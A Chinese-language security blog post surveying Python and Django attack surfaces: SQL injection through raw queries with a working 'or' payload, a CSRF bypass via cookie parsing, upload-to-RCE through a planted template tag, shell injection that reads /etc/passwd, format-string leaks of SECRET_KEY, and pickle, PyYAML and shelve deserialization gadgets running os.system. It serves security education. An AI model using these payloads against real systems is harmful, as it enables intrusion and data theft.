<p>一般来说使用django自带的操作数据库api是不会造成sql注入的,如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Person.objects.filter(first_name&#x3D;request.GET.get(&#39;user&#39;))</span><br></pre></td></tr></table></figure>

<p>不过django依然支持原生sql语法的使用方法,如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">def index(request, *args, **kwargs):</span><br><span class="line">    for e in Person.objects.raw(&#39;select * from FIRST_Person &#39;):</span><br><span class="line">        print(e.first_name,e.last_name)</span><br><span class="line">    return render(request, &#39;home.html&#39;)</span><br></pre></td></tr></table></figure>

<p>控制台结果如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">asd sdf</span><br><span class="line">mapl0 ppp</span><br><span class="line">admin hahaha</span><br></pre></td></tr></table></figure>

<p>如果代码如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">def index(request, *args, **kwargs):</span><br><span class="line">    for e in Person.objects.raw(&#39;select * from FIRST_Person WHERE first_name &#x3D; &#39; + &#39;&quot;&#39; + request.GET.get(&#39;user&#39;) + &#39;&quot;&#39;):</span><br><span class="line">        print(e.last_name)</span><br><span class="line">    return render(request, &#39;home.html&#39;)</span><br></pre></td></tr></table></figure>

<p>访问<strong><a href="http://127.0.0.1:8000/?user=admin">http://127.0.0.1:8000/?user=admin</a></strong>后控制台返回hahaha</p>
<p>而访问<strong><a href="http://127.0.0.1:8000/?user=qqq%22%20or%20%221">http://127.0.0.1:8000/?user=qqq%22%20or%20%221</a></strong>，控制台直接返回了</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sdf</span><br><span class="line">ppp</span><br><span class="line">hahaha</span><br></pre></td></tr></table></figure>

<p><strong>代码/命令执行</strong></p>
<p>除内建的模块，还有<strong>os,commands,subprocess,multiprocessing,pty，Cpickle/pickle，PyYAML</strong>等模块能代码/命令执行，详细可看下文。</p>
<p><strong>CSRF</strong></p>
<p>django这类的框架<strong>自带csrf防护</strong>，不过在去年依然爆出csrf漏洞<a href="http://blog.knownsec.com/2016/10/django-csrf-bypass_cve-2016-7401/"><strong>CVE-2016-7401-Django</strong></a>（知道创宇这篇分析很细致），如果django使用了Google Analytics则可能绕过django自带的csrf防护机制。</p>
<p>Django对于CSRF的防护就是<strong>判断cookie中的csrftoken和提交的csrfmiddlewaretoken</strong>的值是否相等，但是<strong>Google Analytics可以通过referer帮我们设置用户的cookie</strong>，cookie一般如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">utmz&#x3D;123456.123456789.11.2.utmcsr&#x3D;[HOST]|utmccn&#x3D;(referral)|utmcmd&#x3D;referral|utmcct&#x3D;[PATH]</span><br></pre></td></tr></table></figure>

<p>其中[HOST]和[PATH]是由Referer确定的，也就是说当</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Referer: http:&#x2F;&#x2F;x.com&#x2F;helloworld</span><br></pre></td></tr></table></figure>

<p>时，cookie如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">z&#x3D;123456.123456789.11.2.utmcsr&#x3D;x.com|utmccn&#x3D;(referral)|utmcmd&#x3D;referral|utmcct&#x3D;helloworld</span><br></pre></td></tr></table></figure>

<p>django在当时的版本有cookie解析漏洞，当Cookie.SimpleCookie()解析a=hello]b=world这样的字符串时，就会取得a=hello和b=world，所以当Referer为<a href="http://x.com/hello]csrftoken=world%EF%BC%8Ccsrftoken%E5%B0%B1%E8%A2%AB%E6%88%90%E5%8A%9F%E8%B5%8B%E5%80%BC%E3%80%82">http://x.com/hello]csrftoken=world，csrftoken就被成功赋值。</a></p>
<p>详细的<a href="http://blog.knownsec.com/2016/10/django-csrf-bypass_cve-2016-7401/"><strong>代码分析</strong></a>，值得一看。</p>
<p><strong>文件上传</strong></p>
<p>在php环境下如果不限制上传文件后缀会导致getshell，但在django下，如果上传的文件能覆盖类似url.py，<strong>init</strong>.py的文件，攻击者能顺利getshell。参考<a href="https://www.secpulse.com/archives/36220.html">https://www.secpulse.com/archives/36220.html</a> 。还有django只有在development server的模式下才会修改了文件就立刻重启，否则修改了文件也暂时无法生效。</p>
<p>当然除此之外还有其他方法，例如写cron（前提是有权限），和模板文件。</p>
<p>简单说一下写模板文件的过程：</p>
<p>需要在templatetags和templates分别写入一个文件（可能也不叫templatetags，可自行定义），templatetags文件夹内存放自定义标签，上传文件rce.py，代码如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">from django import template</span><br><span class="line">import os</span><br><span class="line">register &#x3D; template.Library()</span><br><span class="line">@register.simple_tag</span><br><span class="line">def some_function(value):</span><br><span class="line">    shell &#x3D; os.system(&#39;touch mapl0&#39;)</span><br><span class="line">    return shell</span><br></pre></td></tr></table></figure>

<p>templates文件夹存放静态html文件，上传文件home.html如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset&#x3D;&quot;UTF-8&quot;&gt;</span><br><span class="line">    &lt;title&gt;Title&lt;&#x2F;title&gt;</span><br><span class="line">&lt;&#x2F;head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&#123;% load rce %&#125;</span><br><span class="line">&#123;% some_function &quot;%s&quot; as func %&#125;</span><br><span class="line">&lt;p&gt; command is &#123;&#123; func &#125;&#125; &lt;&#x2F;p&gt;</span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure>

<p>在view里，index会使用这个模板：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">def index(request, *args, **kwargs):</span><br><span class="line">    return render(request, &#39;home.html&#39;)</span><br></pre></td></tr></table></figure>

<p>访问后，就在项目目录生成了mapl0文件。</p>
<p>可见使用限制很大，还需要一定的权限。首先，文件后缀没有限制，其次上传路径没有限制，templatetags目录已知，另外还需要有view使用这个模板。</p>
<p>另外xml和html文件的自由上传依然可以造成xxe和xss。</p>
<p><strong>文件包含</strong></p>
<p><a href="http://bobao.360.cn/news/detail/1475.html">案例</a></p>
<p>相比之下文件包含比php少得多</p>
<p><strong>重定向</strong></p>
<p>django在今年爆出了两个重定向漏洞<a href="https://paper.seebug.org/274/">CVE-2017-7233&amp;7234</a>其中的CVE-2017-7233与urlparse有关，漏洞的说明可查看下文。</p>
<p><strong>不安全模块及函数</strong></p>
<p><strong>内建函数</strong></p>
<p><strong>input():</strong></p>
<p>python input() 相等于 eval(raw_input(prompt)) ，用来获取控制台的输入,在python3.0以后的版本中取消raw_input,并用input代替.</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">value &#x3D; input(&quot;hello &quot;)</span><br><span class="line">print(&quot;welcome %s&quot; % (value,))</span><br></pre></td></tr></table></figure>

<p>python2命令行下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hello dir()</span><br><span class="line">welcome [&#39;__builtins__&#39;, &#39;__doc__&#39;, &#39;__file__&#39;, &#39;__name__&#39;, &#39;__package__&#39;]</span><br></pre></td></tr></table></figure>

<p>python3命令行下:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hello dir()</span><br><span class="line">welcome dir()</span><br></pre></td></tr></table></figure>

<p><strong>assert():</strong></p>
<p>assert断言是声明其布尔值必须为真的判定，如果发生异常就说明表达示为假。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Traceback (most recent call last):</span><br><span class="line">  File &quot;&#x2F;Users&#x2F;mapl0&#x2F;Desktop&#x2F;资料&#x2F;sec.py&quot;, line 3, in &lt;module&gt;</span><br><span class="line">    assert os.system(&#39;touch test&#39;)</span><br><span class="line">AssertionError</span><br></pre></td></tr></table></figure>

<p>报了个错误，但test文件已被建立</p>
<p><strong>代码执行函数</strong></p>
<p>eval:计算字符串中的表达式</p>
<p>exec:执行字符串中的语句</p>
<p>execfile:用来执行一个文件#python3中已无此函数</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">a &#x3D; &quot;print(&#39;eval:hello&#39;)&quot;</span><br><span class="line">b &#x3D; &quot;print(&#39;exec:hello&#39;)&quot;</span><br><span class="line">eval(a)</span><br><span class="line">exec(b)</span><br></pre></td></tr></table></figure>

<p>python2和python3下结果一样</p>
<p>eval:hello</p>
<p>exec:hello</p>
<p>execfile(‘temp.bin’)#temp.bin内容为print(‘execfile:hello’)</p>
<p>结果</p>
<p>execfile:hello</p>
<p><strong>os模块:</strong></p>
<p>os.system</p>
<p>os.popen#和os.system的区别在于popen会把命令的输出作为返回值</p>
<p>os.spawn</p>
<p><a href="http://wangyongbin.blog.51cto.com/8964308/1672725">os.exec家族</a></p>
<p><strong>commands模块 :</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">commands.getstatusoutput</span><br></pre></td></tr></table></figure>

<p><strong>subprocess模块 :</strong></p>
<p>subprocess.Popen</p>
<p>subprocess.call通过子进程进行外壳注入</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">from subprocess import call</span><br><span class="line">unvalidated_input &#x3D; &#39;&#x2F;bin&#x2F;true&#39;#true命令啥都不做,只设置退出码为0</span><br><span class="line">unvalidated_input +&#x3D; &#39;; cut -d: -f1 &#x2F;etc&#x2F;passwd&#39;</span><br><span class="line">call(unvalidated_input, shell&#x3D;True)#当shell&#x3D;true时，shell命令可被当做多句执行。</span><br></pre></td></tr></table></figure>

<p>运行结果</p>
<p>​    nobody</p>
<p>​    root</p>
<p>​    ……..</p>
<p>multiprocessing多进程模块 :</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import multiprocessing</span><br><span class="line">p &#x3D; multiprocessing.Process(target&#x3D;print, args&#x3D;(&quot;hello&quot;))#target参数为函数名，args为函数所需参数</span><br><span class="line">p.start()</span><br><span class="line">p.join()</span><br></pre></td></tr></table></figure>

<p>运行结果</p>
<p>h e l l o</p>
<p><strong>pty :</strong></p>
<p>只能在linuxmac下使用的<strong>伪终端</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import pty</span><br><span class="line">pty.spawn(&#39;ls&#39;)</span><br></pre></td></tr></table></figure>

<p>在python23下均可执行命令</p>
<p>其他有安全问题模块及函数</p>
<p><strong>codecs :</strong></p>
<p>codecs作用于各种编码之间的相互转换</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import codecs</span><br><span class="line">import io</span><br><span class="line">b &#x3D; b&#39;x41xF5x42x43xF4&#39;</span><br><span class="line">print(&quot;Correct-String %r&quot;) % ((repr(b.decode(&#39;utf8&#39;, &#39;replace&#39;))))</span><br><span class="line">with open(&#39;temp.bin&#39;, &#39;wb&#39;) as fout:</span><br><span class="line">    fout.write(b)</span><br><span class="line">with codecs.open(&#39;temp.bin&#39;, encoding&#x3D;&#39;utf8&#39;, errors&#x3D;&#39;replace&#39;) as fin:</span><br><span class="line">    print(&quot;CODECS-String %r&quot;) % (repr(fin.read()))</span><br><span class="line">with io.open(&#39;temp.bin&#39;, &#39;rt&#39;, encoding&#x3D;&#39;utf8&#39;, errors&#x3D;&#39;replace&#39;) as fin:</span><br><span class="line">    print(&quot;IO-String %r&quot;) % (repr(fin.read()))</span><br></pre></td></tr></table></figure>

<p>当b以二进制方式写入文件后，用codecs在进行读取，如果errors=’replace’且编码形式为utf-8时，则对于xF5和xF4这类不能编码的都会被替换为ufffd。</p>
<p>在python2下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Correct-String &quot;u&#39;A\ufffdBC\ufffd&#39;&quot;</span><br><span class="line">CODECS-String &quot;u&#39;A\ufffdBC&#39;&quot;</span><br><span class="line">IO-String &quot;u&#39;A\ufffdBC\ufffd&#39;&quot;</span><br></pre></td></tr></table></figure>

<p>在Python3下会报错：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">print(&quot;Correct-String %r&quot;) % ((repr(b.decode(&#39;utf8&#39;, &#39;replace&#39;))))</span><br><span class="line">TypeError: unsupported operand type(s) for %: &#39;NoneType&#39; and &#39;str&#39;</span><br></pre></td></tr></table></figure>

<p><strong>ctypes :</strong></p>
<p>ctypes是一个<strong>提供和C语言兼容的数据类型的外部库</strong>，当出现x00的空字符就会出现截断</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import ctypes</span><br><span class="line">buffer &#x3D; ctypes.create_string_buffer(8)</span><br><span class="line">buffer.value&#x3D;&#39;abx00c1234&#39;</span><br><span class="line">print(buffer.value)</span><br><span class="line">print (buffer.raw)</span><br></pre></td></tr></table></figure>

<p>在python2命令行下:</p>
<p>​    ab</p>
<p>​    abc1234</p>
<p>在python3下回报错：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">buffer.value&#x3D;&#39;abx00c1234&#39;</span><br><span class="line">TypeError: bytes expected instead of str instance</span><br></pre></td></tr></table></figure>

<p><strong>Python Interpreter :</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#!python</span><br><span class="line">try:</span><br><span class="line">    if 0:</span><br><span class="line">        yield 5</span><br><span class="line">    print(&quot;T1-FAIL&quot;)</span><br><span class="line">except Exception as e:</span><br><span class="line">    print(&quot;T1-PASS&quot;)</span><br><span class="line">    pass</span><br><span class="line">try:</span><br><span class="line">    if False:</span><br><span class="line">        yield 5</span><br><span class="line">    print(&quot;T2-FAIL&quot;)</span><br><span class="line">except Exception as e:</span><br><span class="line">    print(repr(e))</span><br><span class="line">    pass</span><br></pre></td></tr></table></figure>

<p>对于类似if 0: if False: 的写法，python版本的不同，其测试结果也不同</p>
<p><a href="https://p1.ssl.qhimg.com/t012589bb06bdd991b8.png"><img src="https://p1.ssl.qhimg.com/t012589bb06bdd991b8.png" alt="img"></a></p>
<p>可重用整数 :</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">999+1 is 1000 #False</span><br><span class="line">1+1 is 2 #True</span><br></pre></td></tr></table></figure>

<p>对此的解释是，Python 维护了一个对象连接池，其中保有前几百个整数，重用它们会节约内存和对象的创建。</p>
<p>浮点数比较 :</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">2.2 * 3.0 &#x3D;&#x3D; 3.3 * 2.0 #False</span><br></pre></td></tr></table></figure>

<p>由于固有受限精度，以及十进制与二进制小数表示所产生的差异导致的舍入错误。</p>
<p>无穷大 :</p>
<p>python支持无穷大的概念，但在python2下出现了这样的情况</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Type &quot;help&quot;, &quot;copyright&quot;, &quot;credits&quot; or &quot;license&quot; for more information.</span><br><span class="line">10**1000000 &gt; float(&#39;infinity&#39;)</span><br><span class="line">False</span><br><span class="line">float &gt; float(&#39;infinity&#39;)</span><br><span class="line">True</span><br></pre></td></tr></table></figure>

<p>python3下</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"> 10**1000000 &gt; float(&#39;infinity&#39;)</span><br><span class="line">False</span><br><span class="line"> float &gt; float(&#39;infinity&#39;)</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File &quot;&lt;stdin&gt;&quot;, line 1, in &lt;module&gt;</span><br><span class="line">TypeError: unorderable types: type() &gt; float()</span><br></pre></td></tr></table></figure>

<p><strong>builtins :</strong></p>
<p>此模块在python启动后首先加载到内存，此时还没有执行任何程序员写的代码，在Python2.X版本中，内建模块被命名为__builtin__，而到了Python3.X版本中更名为builtins。</p>
<p>在 Python 2中， 内置对象可以通过魔法 <strong>builtins</strong> 模块进行访问。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">__builtins__.False, __builtins__.True &#x3D; True, False</span><br><span class="line"> True</span><br><span class="line"> False</span><br><span class="line"> int(True)</span><br><span class="line"> 0</span><br></pre></td></tr></table></figure>

<p>false被赋值成true，true被赋值成false</p>
<p><strong>urllib2:</strong></p>
<p>Python 的 urllib 库曾出过一个头注入的漏洞，<a href="http://blog.neargle.com/SecNewsBak/drops/Python%20urllib%20HTTP%E5%A4%B4%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.html">CVE-2016-5699</a></p>
<p>如果请求头里出现了**%0A**则直接换行导致攻击者可以注入额外http头和请求方法，可在ssrf里攻击redis或者memcached。</p>
<p>Python2/Python3较新的版本均在出口处的putheader()函数里添加了一个检验，发现不合法URL会报一个error.</p>
<p><strong>tarfile/ZipFile:</strong></p>
<p>tarfile模块可以读取和写入tar文件，包括使用gzip或bz2压缩的压缩文件。</p>
<p>ZipFile模块提供了创建，读取，写入，附加和列出ZIP文件的函数。</p>
<p>TarFile.extractall使用此函数提取文件时，文件可能创建在其他路径，官方建议不要从不信任的来源提取文件。</p>
<p>ZipFile.extractall也有同样的问题，解压时文件可能创建在其他路径，但在2.7.4版本中，模块会试图阻止这种行为。</p>
<p><strong>urlparse :</strong></p>
<p><a href="https://paper.seebug.org/274/">CVE-2017-7233</a> urllib.parse.urlparse的特殊情况曾给django造成一个url跳转漏洞。</p>
<p>django的<strong>is_safe_ur</strong>l函数可用于检测url是或否安全，但整合各函数是基于urllib.parse.urlparse的，urlparse在当scheme不等于http，path为纯数字时不能正常分割使得is_safe_url为true，从而达到bypass的目的。</p>
<p>例如 https:1029415385，is_safe_url会直接判断为true。</p>
<p><strong>格式化字符串漏洞:</strong></p>
<p>起因是python的新方法format，示例如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">class mapl0:</span><br><span class="line">    user &#x3D; &#39;mapl0&#39;</span><br><span class="line">    password &#x3D; &#39;hahaha&#39;</span><br><span class="line">    key &#x3D; &#39;123456&#39;</span><br><span class="line">print(&quot;This is &#123;user.user&#125; &#123;user.password&#125;&quot;.format(user &#x3D; mapl0))</span><br></pre></td></tr></table></figure>

<p>我们可以通过format将mapl0类中的属性输出出来，在这篇<a href="https://paper.seebug.org/175/">paper</a>中(@phithon)就有类似的情况：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">def view(request, *args, **kwargs):</span><br><span class="line">    user &#x3D; get_object_or_404(User, pk&#x3D;request.GET.get(&#39;uid&#39;))</span><br><span class="line">    template &#x3D; &#39;This is &#123;user&#125;&#39;s email: &#39; + request.GET.get(&#39;email&#39;)</span><br><span class="line">    return HttpResponse(template.format(user&#x3D;user))</span><br></pre></td></tr></table></figure>

<p>由于request.GET.get(‘email’)也就是用户通过get传入的email参数完全可控，我们就能让request.user里的任意属性输出出来，例如{user.password}。</p>
<p>通过debug查看了一下request.user里的内容,其中session_key,目录，secret_key等等敏感信息都能查看，其中SECRET_KEY如果泄露，则可能配合django反序列化漏洞实现rce。</p>
<p><a href="https://p3.ssl.qhimg.com/t0156734683638758a4.png"><img src="https://p3.ssl.qhimg.com/t0156734683638758a4.png" alt="img"></a></p>
<p>Jinja的沙盒绕过与此同理。顺便一说，在<a href="https://paper.seebug.org/175/">paper</a>还提到的f修饰符很有意思，在python3.6版本会后，被f/F修饰的字符串将会被当做代码执行。</p>
<p><strong>反序列化</strong></p>
<p><strong>Cpickle/pickle 反序列化：</strong></p>
<p>python2 使用cPickle，python3 使用pickle，__reduce__函数会在被反序列化是执行，类似php里的__wakeup，当我们序列化了一个带有__reduce__的类时，将其反序列化即可执行__reduce__里的代码</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import os</span><br><span class="line">import cPickle</span><br><span class="line">a &#x3D; 1</span><br><span class="line"># Exploit that we want the target to unpickle</span><br><span class="line">class Exploit(object):</span><br><span class="line">    def __reduce__(self):</span><br><span class="line">        global a</span><br><span class="line">        a &#x3D; 10</span><br><span class="line">        os.system(&quot;pwd&quot;)</span><br><span class="line">        return (os.system, (&#39;ls&#39;,))</span><br><span class="line">shellcode &#x3D; cPickle.dumps(Exploit())#cPickle.dumps序列化操作</span><br><span class="line">cPickle.loads(shellcode)#cPickle.loads反序列化操作</span><br><span class="line">print a</span><br></pre></td></tr></table></figure>

<p>pickle用法类似</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import os</span><br><span class="line">import pickle</span><br><span class="line"># Exploit that we want the target to unpickle</span><br><span class="line">class Exploit(object):</span><br><span class="line">    def __reduce__(self):</span><br><span class="line">        return (os.system, (&#39;ls&#39;,))</span><br><span class="line">shellcode &#x3D; pickle.dumps(Exploit())</span><br><span class="line">pickle.loads(shellcode)</span><br></pre></td></tr></table></figure>

<p><a href="http://www.freebuf.com/vuls/77591.html">Django任意代码</a>在django1.6版本前存在任意代码执行漏洞，其漏洞起因就是pickle。</p>
<p>在django1.6以下，session默认是采用pickle执行序列号操作，在1.6及以上版本默认采用json序列化，但还需要知道SECRET_KEY以及目标采用了signed_cookies。</p>
<p><a href="https://www.leavesongs.com/PENETRATION/zhangyue-python-web-code-execute.html">掌阅iReader某站Python漏洞挖掘</a>，通过redis写session从而反序列化getshell。</p>
<p><strong>PyYAML 对象类型解析导致的命令执行问题：</strong></p>
<p><a href="http://blog.knownsec.com/2016/03/pyyaml-tags-parse-to-command-execution/">http://blog.knownsec.com/2016/03/pyyaml-tags-parse-to-command-execution/</a> </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import yaml</span><br><span class="line">content &#x3D; &#39;&#39;&#39;---</span><br><span class="line">!!python&#x2F;object&#x2F;apply:subprocess.check_output [[ls]]#subprocess.check_output父进程等待子进程完成 返回子进程向标准输出的输出结果</span><br><span class="line">...&#39;&#39;&#39;</span><br><span class="line">print yaml.load(content)</span><br></pre></td></tr></table></figure>

<p>python2下结果</p>
<p>1.py</p>
<p><strong>init</strong>.py</p>
<p><strong>pycache</strong></p>
<p>……</p>
<p>python3下结果</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">b&#39;1.pyn__init__.pyn__pycache__n................</span><br></pre></td></tr></table></figure>

<p><strong>shelve：</strong></p>
<p>shelve用处是让对象持久化，但它在序列化与反序列化的过程中使用了pickle模块，因此我们可以利用shelve会调用的pickle在反序列化过程中执行代码。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import shelve</span><br><span class="line">import os</span><br><span class="line">class exp(object):</span><br><span class="line">    def __reduce__(self):</span><br><span class="line">        return (os.system(&#39;ls&#39;))</span><br><span class="line">file &#x3D; shelve.open(&quot;test&quot;)</span><br><span class="line">file[&#39;exp&#39;] &#x3D; exp()</span><br><span class="line">print(file[&#39;exp&#39;])</span><br></pre></td></tr></table></figure>

<p>一些在较新版本被弃用的函数和模块</p>
<p><strong>rexec:</strong></p>
<p>在python2.6后被弃用，相关<a href="https://docs.python.org/2/library/rexec.html">文档</a>.</p>
<p><strong>bastion:</strong></p>
<p>在python2.6后被弃用，相关<a href="https://docs.python.org/2/library/bastion.html">文档</a>.</p>
<p><strong>tempfile.mktemp:</strong></p>
<p>此函数自从2.3版本不推荐使用并使用mkstemp()代替，相关<a href="https://docs.python.org/3/library/tempfile.html?highlight=mktemp#tempfile.mktemp">文档</a></p>
<p><strong>总结</strong></p>
<p>python安全还远不止上文所述部分，随之python使用者的增多，其安全性必然也会不断地收到挑战，而我们也需要从中不断学习以应对随时袭来的威胁。</p>
<p><strong>参考文章</strong></p>
<p><a href="http://python.jobbole.com/82746/">http://python.jobbole.com/82746/</a> </p>
<p><a href="http://www.freebuf.com/articles/web/73669.html">http://www.freebuf.com/articles/web/73669.html</a> </p>
<p><a href="https://virusdefender.net/index.php/archives/576/">https://virusdefender.net/index.php/archives/576/</a> </p>
<p><a href="https://paper.seebug.org/337/">https://paper.seebug.org/337/</a> </p>
<p><a href="http://www.freebuf.com/articles/system/89165.html">http://www.freebuf.com/articles/system/89165.html</a> </p>
]]></content>
      <categories>
        <category>网络安全</category>
        <category>python</category>
      </categories>
      <tags>
        <tag>网络安全</tag>
        <tag>渗透测试</tag>
        <tag>web</tag>
        <tag>python</tag>
      </tags>
  </entry>
</search>
